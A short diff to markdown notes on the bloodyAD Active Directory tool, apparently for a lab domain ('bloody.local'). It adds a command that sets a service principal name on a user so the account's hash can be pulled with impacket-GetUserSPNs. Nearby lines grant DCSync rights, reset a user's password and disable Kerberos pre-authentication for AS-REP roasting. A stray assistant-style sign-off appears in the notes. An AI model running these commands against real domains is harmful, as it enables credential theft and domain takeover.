@@ -23,6 +23,8 @@ add dcsync permissions
 
 create computer account
 
+Add a SPN attribute to be able to get the hash of the user using impacket-GetUserSPNs
+`set object "ethan" servicePrincipalName -v 'Hello/Hello'`
 
 setting other users password
 `set password john.doe 'Password123!'`
@@ -126,6 +128,7 @@ add dcsynd perms to user
 ```
 ### To test
 
+```
 Set "DONT_REQ_PREAUTH" (for AS-REP roast)
 
 bloodyAD -u Administrator -d bloody.local -p Password512! --host 192.168.10.2 add uac john.doe DONT_REQ_PREAUTH
@@ -208,6 +211,7 @@ Kali Linux Tutorials
 . Use these as a reliable foundation for enumeration, privilege escalation, and AD exploitation with bloodyAD. Let me know if you'd like guidance on chaining them or interpreting results!
 
 
+```
 
 
 
